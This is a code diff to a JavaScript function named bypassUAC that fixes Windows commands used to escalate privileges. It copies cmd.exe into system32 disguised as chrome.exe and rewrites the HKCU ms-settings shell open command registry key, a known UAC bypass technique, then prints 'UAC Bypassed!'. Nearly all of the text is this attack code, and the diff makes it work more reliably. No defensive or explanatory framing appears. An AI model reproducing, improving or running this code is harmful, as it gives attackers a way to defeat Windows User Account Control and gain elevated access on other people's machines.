@@ -34,12 +34,12 @@ const bypassUAC = async () => {
     true,
   );
   await executeCommand(
-    'copy c:\\Windows\\system32\\cmd.exe copy c:\\Windows\\system32\\chrome.exe',
+    'copy c:\\Windows\\system32\\cmd.exe c:\\Windows\\system32\\chrome.exe',
     false,
   );
 
   await executeCommand(
-    'Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(default)" -Value "%SystemRoot%\\system32\\chrome.exe" "%1"',
+    'Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(default)" -Value "%SystemRoot%\\system32\\chrome.exe"',
     true,
   );
   console.log('UAC Bypassed!');
